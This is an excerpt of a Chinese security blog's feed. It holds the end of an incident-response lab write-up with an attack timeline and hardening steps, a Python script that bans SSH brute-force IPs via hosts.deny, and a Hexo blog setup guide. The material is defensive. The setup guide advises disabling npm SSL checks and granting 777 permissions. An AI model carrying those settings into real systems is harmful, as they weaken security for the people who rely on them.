alt="image-20240127154614968"></p><p>攻击流程总结：192.168.226.1 在1月13日 21:57:56通过ssh爆破成功，22:00:27登陆靶机，22:01:18创建后门用户wxiaoge、00:51:12 上传shell.elf、00:57:03上传centos_core.elf、00:59:45 上传恶意ps文件并改动正确的ps文件、01:05:53 建立计划任务。</p><h3 id="3、系统加固"><a href="#3、系统加固" class="headerlink" title="3、系统加固"></a>3、系统加固</h3><p>加固的地方有很多，在这里只列出部分用户加固。</p><p>1、修改root用户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127162800354.png" alt="image-20240127162800354"></p><p>2、删除不必要的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo userdel -r &lt;用户名&gt;</span><br></pre></td></tr></table></figure><p>3、检测空口令用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;$2==&quot;!!&quot; &#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">然后对比/etc/passwd 的可登录用户</span><br><span class="line">passwd &lt;用户名&gt;   #给用户修改密码</span><br></pre></td></tr></table></figure><p>4、口令配置文件</p><p>&#x2F;etc&#x2F;pam.d&#x2F;system-auth </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">password requisite pam_cracklib.so retry=3 difok=3 minlen=10#文件修改最小长度</span><br><span class="line"></span><br><span class="line">auth required  pam_tally2.so onerr=fail deny=3 unlock_time=300#错误次数超过3次进行锁定。要写在auth 的最上面</span><br><span class="line"></span><br><span class="line">authconfig --passminlen=8 --passminclass=3 --update#passminlen密码长度，passminclass密码种类：数字，字母，特殊字符三项</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python武器库】防SSH爆破自动封禁IP脚本</title>
      <link href="/2024/02/14/Python-ssh-IPBan-Script/"/>
      <url>/2024/02/14/Python-ssh-IPBan-Script/</url>
      
        <content type="html"><![CDATA[<h1 id="【Python武器库】防SSH爆破自动封禁IP脚本"><a href="#【Python武器库】防SSH爆破自动封禁IP脚本" class="headerlink" title="【Python武器库】防SSH爆破自动封禁IP脚本"></a>【Python武器库】防SSH爆破自动封禁IP脚本</h1><h2 id="一、相关知识"><a href="#一、相关知识" class="headerlink" title="一、相关知识"></a>一、相关知识</h2><h3 id="1、ssh爆破后的痕迹残留"><a href="#1、ssh爆破后的痕迹残留" class="headerlink" title="1、ssh爆破后的痕迹残留"></a>1、ssh爆破后的痕迹残留</h3><p>我们可以在Centos系统的 &#x2F;var&#x2F;log&#x2F;secure（Debian 是&#x2F;var&#x2F;log&#x2F;auth.log文件） 文件中看到有关ssh 的登陆信息，共有如下三种情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">登陆成功：Accepted password for root from 192.168.44.1 port 50854 ssh2</span><br><span class="line">登陆失败：Failed password for root from 192.168.44.1 port 50854 ssh2</span><br><span class="line">用户不存在：Invalid user test from 192.168.31.50 port 54169</span><br></pre></td></tr></table></figure><h3 id="2、如何封禁IP"><a href="#2、如何封禁IP" class="headerlink" title="2、如何封禁IP"></a>2、如何封禁IP</h3><p>有关IP封禁的黑白名单文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IP黑名单：/etc/hosts.deny</span><br><span class="line">IP白名单：/etc/hosts.allow</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sshd:192.168.31.50#封禁192.168.31.50这个IP的sshd服务</span><br><span class="line">all:192.168.31.50#封禁192.168.31.50这个IP的所有服务</span><br></pre></td></tr></table></figure><h2 id="二、Python防SSH爆破脚本"><a href="#二、Python防SSH爆破脚本" class="headerlink" title="二、Python防SSH爆破脚本"></a>二、Python防SSH爆破脚本</h2><p>1、以下皆以Centos系统为例，我们可以利用多进程实时监控&#x2F; var&#x2F;log&#x2F;secure </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 读取安全日志</span><br><span class="line">popen = subprocess.Popen(&#x27;tail -f &#x27; + logFile, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"># 开始监控</span><br><span class="line">while True:</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    line = popen.stdout.readline().strip()</span><br><span class="line">    if line:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>2、遇到不存在的用户尝试登陆的时候直接封IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">abnormal_invalid_user = re.search(&#x27;Invalid user \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;, str(line))</span><br><span class="line">abnormal_failed_password = re.search(&#x27;Failed password for \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;, str(line))</span><br><span class="line">if abnormal_invalid_user and not denyDict.get(abnormal_invalid_user.group(1)):</span><br><span class="line">subprocess.getoutput(&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;.format(abnormal_invalid_user.group(1), hostDeny))</span><br><span class="line">denyDict[abnormal_invalid_user.group(1)] = time.time()</span><br><span class="line">time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">print(&#x27;&#123;&#125; --- ip:&#123;&#125; 因为登陆错误用户名 被拉入黑名单&#x27;.format(time_str, abnormal_invalid_user.group(1)))</span><br></pre></td></tr></table></figure><p>3、遇到正确的用户的名，但是密码失败次数超过上限封IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">elif abnormal_failed_password:</span><br><span class="line">ip = abnormal_failed_password.group(1)</span><br><span class="line">tempIP[ip] = tempIP.get(ip, 0) + 1</span><br><span class="line">if tempIP[ip] &gt; password_wrong_num and not denyDict.get(ip):</span><br><span class="line">subprocess.getoutput(&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;.format(ip, hostDeny))</span><br><span class="line">denyDict[ip] = time.time()</span><br><span class="line">time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">print(&#x27;&#123;&#125; --- ip:&#123;&#125; 因为密码错误次数超过上限 被拉入黑名单&#x27;.format(time_str, ip))</span><br></pre></td></tr></table></figure><p>4、检查解封，达到限制的时间之后解封IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 检查黑名单中的IP地址是否超过解封时间，若超过则解封</span><br><span class="line">end_time = time.time()</span><br><span class="line">for ip, start_time in list(denyDict.items()):  # 使用list()将字典项转换为列表项以避免在迭代时修改字典大小</span><br><span class="line">    if end_time - start_time &gt; unblock_time:</span><br><span class="line">        subprocess.getoutput(&#x27;sed -i &quot;/^sshd:&#123;&#125;/d&quot; &#123;&#125;&#x27;.format(ip, hostDeny))</span><br><span class="line">        denyDict.pop(ip)  # 使用 pop() 方法从字典中彻底删除指定键值对</span><br><span class="line">        time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">        print(&#x27;&#123;&#125; --- ip:&#123;&#125; 已从黑名单中解封&#x27;.format(time_str, ip))</span><br></pre></td></tr></table></figure><h2 id="三、完整脚本代码"><a href="#三、完整脚本代码" class="headerlink" title="三、完整脚本代码"></a>三、完整脚本代码</h2><p>如下violate_blastIP.py 脚本代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import subprocess</span><br><span class="line">from multiprocessing import Process</span><br><span class="line"></span><br><span class="line">logFile = &#x27;/var/log/secure&#x27;     # 安全日志文件路径</span><br><span class="line">hostDeny = &#x27;/etc/hosts.deny&#x27;    # 黑名单文件路径</span><br><span class="line">password_wrong_num = 3      # 密码错误次数阈值</span><br><span class="line">unblock_time = 10 * 60 * 60  # 解封时间：10小时</span><br><span class="line"></span><br><span class="line"># 获取已经加入黑名单的IP，转换为字典</span><br><span class="line">def getDenyIP():</span><br><span class="line">    denyDict = &#123;&#125;</span><br><span class="line">    with open(hostDeny, &#x27;r&#x27;) as file:  # 使用with语句以确保文件在使用后被正确关闭</span><br><span class="line">        for ip in file.readlines():</span><br><span class="line">            abnormal = re.search(r&#x27;(\d+\.\d+\.\d+\.\d+)&#x27;, ip)</span><br><span class="line">            if abnormal:</span><br><span class="line">                denyDict[abnormal.group(1)] = time.time()</span><br><span class="line">    return denyDict</span><br><span class="line"></span><br><span class="line"># 监控方法</span><br><span class="line">def monitorLog(logFile):</span><br><span class="line">    # 统计密码错误的次数</span><br><span class="line">    tempIP = &#123;&#125;</span><br><span class="line">    # 获取已经进入黑名单的IP</span><br><span class="line">    denyDict = getDenyIP()</span><br><span class="line">    # 读取安全日志</span><br><span class="line">    popen = subprocess.Popen(&#x27;tail -f &#x27; + logFile, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    # 开始监控</span><br><span class="line">    print(&quot;------ SSH防爆破脚本开启 ------&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        line = popen.stdout.readline().strip()</span><br><span class="line">        if line:</span><br><span class="line">            abnormal_invalid_user = re.search(&#x27;Invalid user \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;, str(line))</span><br><span class="line">            abnormal_failed_password = re.search(&#x27;Failed password for \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;, str(line))</span><br><span class="line">            if abnormal_invalid_user and not denyDict.get(abnormal_invalid_user.group(1)):</span><br><span class="line">                subprocess.getoutput(&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;.format(abnormal_invalid_user.group(1), hostDeny))</span><br><span class="line">                denyDict[abnormal_invalid_user.group(1)] = time.time()</span><br><span class="line">                time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">                print(&#x27;&#123;&#125; --- ip:&#123;&#125; 因为登陆错误用户名 被拉入黑名单&#x27;.format(time_str, abnormal_invalid_user.group(1)))</span><br><span class="line">            elif abnormal_failed_password:</span><br><span class="line">                ip = abnormal_failed_password.group(1)</span><br><span class="line">                tempIP[ip] = tempIP.get(ip, 0) + 1</span><br><span class="line">                if tempIP[ip] &gt; password_wrong_num and not denyDict.get(ip):</span><br><span class="line">                    subprocess.getoutput(&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;.format(ip, hostDeny))</span><br><span class="line">                    denyDict[ip] = time.time()</span><br><span class="line">                    time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">                    print(&#x27;&#123;&#125; --- ip:&#123;&#125; 因为密码错误次数超过上限 被拉入黑名单&#x27;.format(time_str, ip))</span><br><span class="line">        </span><br><span class="line">        # 检查黑名单中的IP地址是否超过解封时间，若超过则解封</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        for ip, start_time in list(denyDict.items()):  # 使用list()将字典项转换为列表项以避免在迭代时修改字典大小</span><br><span class="line">            if end_time - start_time &gt; unblock_time:</span><br><span class="line">                subprocess.getoutput(&#x27;sed -i &quot;/^sshd:&#123;&#125;/d&quot; &#123;&#125;&#x27;.format(ip, hostDeny))</span><br><span class="line">                denyDict.pop(ip)  # 使用 pop() 方法从字典中彻底删除指定键值对</span><br><span class="line">                time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">                print(&#x27;&#123;&#125; --- ip:&#123;&#125; 已从黑名单中解封&#x27;.format(time_str, ip))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    monitorLog(logFile)</span><br></pre></td></tr></table></figure><h2 id="四、封禁效果"><a href="#四、封禁效果" class="headerlink" title="四、封禁效果"></a>四、封禁效果</h2><p><img src="/img/Python-ssh-IPBan-Script/1.png" alt="1"></p><p><img src="/img/Python-ssh-IPBan-Script/2.png" alt="2"></p><p>如下：IP192.168.31.50 被封禁ssh服务<img src="/img/Python-ssh-IPBan-Script/3.png" alt="3"></p><p><img src="/img/Python-ssh-IPBan-Script/4.png" alt="4"></p><p>超过设定的时间将会自动解除封禁：</p><p><img src="/img/Python-ssh-IPBan-Script/5.png" alt="5"></p>]]></content>
      
      
      <categories>
          
          <category> Python武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python武器库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】Hexo-Butterfly个人博客搭建</title>
      <link href="/2024/02/12/Extracurricular-experience-hexo-build/"/>
      <url>/2024/02/12/Extracurricular-experience-hexo-build/</url>
      
        <content type="html"><![CDATA[<h1 id="【其他经验】Hexo-Butterfly主题个人博客搭建"><a href="#【其他经验】Hexo-Butterfly主题个人博客搭建" class="headerlink" title="【其他经验】Hexo-Butterfly主题个人博客搭建"></a>【其他经验】Hexo-Butterfly主题个人博客搭建</h1><h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><ol><li><p>使用win11的渗透测试主机。因为这个主机内含许多博客必须的基础环境，且有kali linux这个双系统，每次使用完之后可以自动释放空间，而kali 有中文和.md编辑器的问题。</p></li><li><p>将我们的博客部署到win11的kali里面，所需要的基础环境如下（没有的直接在kali 中用命令安装即可）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git -v</span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm -v</span><br><span class="line">cnpm install -g hexo-cli</span><br><span class="line">hexo -v</span><br></pre></td></tr></table></figure></li><li><p>如果cnpm那里出错，可以用如下进行安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm cache clean --force</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org --strict-ssl=false</span><br></pre></td></tr></table></figure><p>cnpm介绍：跟npm是同一个东西，不过使用的是中国境内的源。以下使用npm 的场景均可用cnpm代替。</p></li><li><p>我们可以给npm配置成全局的taobao地址</p><p>然后再去下载cnpm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></li></ol><h2 id="二、本地搭建"><a href="#二、本地搭建" class="headerlink" title="二、本地搭建"></a>二、本地搭建</h2><p>使用Hexo 来搭建博客（本地启动）</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、先找一个空白文件夹</span><br><span class="line"><span class="number">2</span>、初始化博客：sudo hexo init</span><br><span class="line"><span class="number">3</span>、启动博客：hexo s（hexo server -p <span class="number">1314</span>）</span><br><span class="line"><span class="number">4</span>、访问博客：<span class="attr">http</span>:<span class="comment">//localhost:4000</span></span><br><span class="line"><span class="number">5</span>、创建新的博客文章：hexo n <span class="string">&quot;MyFirst-Blog&quot;</span></span><br><span class="line"><span class="number">6</span>、新的博客文章在中查看：cd source/_posts/</span><br><span class="line"><span class="number">7</span>、发现是.<span class="property">md</span>文章结构，可以用<span class="title class_">Typora</span>进行编辑（我们在win11中安装typora编辑，同时还需要在kali中给到<span class="number">777</span>权限）</span><br><span class="line"><span class="number">8</span>、文章写完之后清理下缓存：hexo clean</span><br><span class="line"><span class="number">9</span>、重新生成和启动：hexo g、hexo s</span><br><span class="line"><span class="number">10</span>、重新访问：<span class="attr">http</span>:<span class="comment">//localhost:4000</span></span><br></pre></td></tr></table></figure><h2 id="三、部署到远端（Github）或-其他"><a href="#三、部署到远端（Github）或-其他" class="headerlink" title="三、部署到远端（Github）或 其他"></a>三、部署到远端（Github）或 <a href="https://blog.csdn.net/guixinchn/article/details/107787660">其他</a></h2><h3 id="1、部署到-Github"><a href="#1、部署到-Github" class="headerlink" title="1、部署到 Github"></a>1、部署到 Github</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>登录自己的 <span class="title class_">Github</span>。</span><br><span class="line"><span class="number">2.</span>新建一个仓库：</span><br><span class="line">注意仓库的名称：一定是你的昵称.<span class="property">github</span>.<span class="property">io</span></span><br><span class="line">例如我的 <span class="title class_">Github</span> 昵称是 qinghan586，那么仓库名称输入：qinghan586.<span class="property">github</span>.<span class="property">io</span></span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-hexo-build/Untitled.png" alt="Untitled"></p><p><img src="/img/Extracurricular-experience-hexo-build/Untitled2.png" alt="Untitled2"></p><p>现在是个空仓库，地址是这个，先放着。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span>然后用ssh连接github</span><br><span class="line"><span class="number">1</span>、先在本地kali生成ssh密钥：ssh-keygen -t rsa -C <span class="string">&quot;你的邮箱&quot;</span></span><br><span class="line"><span class="number">2</span>、之后找到.<span class="property">ssh</span>文件夹下的id_rsa.<span class="property">pub</span>文件</span><br><span class="line"><span class="number">3</span>、复制里面的内容到github主页的ssh密钥设置那里。随意名字加id_rsa.<span class="property">pub</span> 内容</span><br><span class="line"><span class="number">4</span>、测试连接：ssh -T git@github.<span class="property">com</span></span><br></pre></td></tr></table></figure><p><strong><strong>继续在 blog 目录下，输入命令行操作：</strong></strong></p><p>装 Git 部署的插件：<code>cnpm install --save hexo-deployer-git</code></p><p><img src="/img/Extracurricular-experience-hexo-build/Untitled3.png" alt="Untitled3"></p><p>里面的红色警告可以忽略不管。</p><p>去 blog根目录下，修改<code>_config.yml</code>即可。注意：<code>blog</code>文件夹下的其它文件下也有<code>_config.yml</code>文件，别改错了文件。</p><p><strong><strong>文件的最底部修改成这样：</strong></strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy</span>:</span><br><span class="line">  <span class="attr">type</span>: git</span><br><span class="line">  <span class="attr">repo</span>: git@github.<span class="property">com</span>:<span class="title class_">Lusensec</span>/<span class="title class_">Lusensec</span>.<span class="property">github</span>.<span class="property">io</span>.<span class="property">git</span></span><br><span class="line">  <span class="attr">branch</span>: master</span><br></pre></td></tr></table></figure><p>注意：deploy: type: repository: branch: 后面都有一个英文的空格。</p><p>用 nopad++修改后一定要保存！</p><p>删除静态文章：<code>hexo c</code></p><p>清除缓存：<code>hexo g</code></p><p>部署到远端：<code>hexo d</code></p><p>往远端推成功后，刷新 Github 仓库，发现多了很多东西，这些就是我的博客内容：</p><p>访问<code>Lusensec.github.io</code>就可以直接打开，并看到博客部署到 Github 上去了。</p><p>如果失败，请增加如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;设置的邮箱&quot;</span><br><span class="line">git config --global user.name &quot;你的GitHub名称&quot;</span><br></pre></td></tr></table></figure><h3 id="2、GitHub-和-Gitee-双部署"><a href="#2、GitHub-和-Gitee-双部署" class="headerlink" title="2、GitHub 和 Gitee 双部署"></a>2、GitHub 和 Gitee 双部署</h3><p>根据佬的文章：<a href="https://blog.csdn.net/guixinchn/article/details/107787660">https://blog.csdn.net/guixinchn/article/details/107787660</a></p><p>在部署Github之后再进行Gitee 部署，之后修改<code>_config.yml</code>文件即可实现双部署：</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240219160916193.png" alt="image-20240219160916193"></p><p>但是对于Gitee 来说：我们上传之后需要在仓库页面的“服务” &gt; Gitee Pages &gt;  勾选“强制使用HTTPS”  &gt; 点击“启动” 进行手动更新。手动更新完成之后再访问网页才会更新。</p><h2 id="四、安装hexo的butterfly主题"><a href="#四、安装hexo的butterfly主题" class="headerlink" title="四、安装hexo的butterfly主题"></a>四、安装hexo的butterfly主题</h2><ol><li><p>安装butterfly主题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure></li><li><p>修改_config.yml</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme</span>: butterfly</span><br></pre></td></tr></table></figure></li><li><p>安装插件</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure></li><li><p>设置 _config.butterfly.yml</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将 themes/butterfly/_config.<span class="property">yml</span> 重命名为_config.<span class="property">butterfly</span>.<span class="property">yml</span> 文件</span><br><span class="line">再将其复制到 博客 目录下</span><br><span class="line">并删除 _config.<span class="property">landscape</span>.<span class="property">yml</span> 文件</span><br></pre></td></tr></table></figure></li></ol><h2 id="五、butterfly主题其他美化"><a href="#五、butterfly主题其他美化" class="headerlink" title="五、butterfly主题其他美化"></a>五、butterfly主题其他美化</h2><h3 id="1、其他美化修改"><a href="#1、其他美化修改" class="headerlink" title="1、其他美化修改"></a>1、其他美化修改</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、主题语言：默认是en</span><br><span class="line">支持<span class="title function_">default</span>(en)、zh-<span class="title function_">CN</span>(简体中文)、zh-<span class="title function_">TW</span>(繁体中文)</span><br><span class="line"><span class="number">2</span>、网站资料：</span><br><span class="line">如标题、副标题、邮箱等个人资料在根目录的 _config.<span class="property">yml</span></span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-hexo-build/Untitled4.png" alt="Untitled4"></p><h3 id="2、导航菜单"><a href="#2、导航菜单" class="headerlink" title="2、导航菜单"></a>2、导航菜单</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">在_config.butterfly.yml 文件中，最开始的 Menu 目录的位置，将menu下的注释打开，缩进为两格。</span><br><span class="line">格式：名字： 路径 || 图标</span><br><span class="line">并修改成自己对应的东西。</span><br><span class="line">如下所示：标签：/tags/ || fas fa-tags</span><br><span class="line"></span><br><span class="line">标签页：</span><br><span class="line">前往你的 Hexo 博客的根目錄</span><br><span class="line">輸入 hexo new page tags</span><br><span class="line">你會找到 source/tags/index.md 這個文件</span><br><span class="line">修改這個文件：</span><br><span class="line">記得添加 type: &quot;tags&quot;</span><br><span class="line"></span><br><span class="line">分类页：</span><br><span class="line">前往你的 Hexo 博客的根目錄</span><br><span class="line">輸入 hexo new page categories</span><br><span class="line">你會找到 source/categories/index.md 這個文件</span><br><span class="line">修改這個文件：</span><br><span class="line">記得添加 type: &quot;categories&quot;</span><br><span class="line"></span><br><span class="line">友情链接：</span><br><span class="line">前往你的 Hexo 博客的根目錄</span><br><span class="line">輸入 hexo new page link</span><br><span class="line">你會找到 source/link/index.md 這個文件</span><br><span class="line">修改這個文件：</span><br><span class="line">記得添加 type: &quot;link&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">https://butterfly.js.org/posts/dc584b87</span><br></pre></td></tr></table></figure><h3 id="3、文章插入本地图片"><a href="#3、文章插入本地图片" class="headerlink" title="3、文章插入本地图片"></a>3、文章插入本地图片</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、安装一个插件（复制不行就手打）</span><br><span class="line">npm install hexo-renderer-marked</span><br><span class="line">2、修改_config.yml文件：</span><br><span class="line">post_asset_folder: true</span><br><span class="line">3、之后hexo new的时候，就会自动创建一个文件夹，里面放图片的</span><br><span class="line">4、完成后即可在md文件中引用，格式如下：</span><br><span class="line">![标题](图片文件名)</span><br><span class="line">![123](123.jpg)</span><br><span class="line"></span><br><span class="line">后续设置：https://zhuanlan.zhihu.com/p/265077468</span><br></pre></td></tr></table></figure><h3 id="4、文章头部设置"><a href="#4、文章头部设置" class="headerlink" title="4、文章头部设置"></a>4、文章头部设置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">title: Hexo 个人博客搭建</span><br><span class="line">date: 2024-01-07 20:11:08</span><br><span class="line">tags: 1.0 #标签</span><br><span class="line">categories: 基础知识 #分类</span><br><span class="line">description: hexo个人博客加butterfly主题搭建 #描述</span><br><span class="line">top_img: /img/010.jpg #顶部背景图</span><br><span class="line">cover: /img/1.jpg #文章封面</span><br></pre></td></tr></table></figure><h3 id="5、博客内部文章跳转"><a href="#5、博客内部文章跳转" class="headerlink" 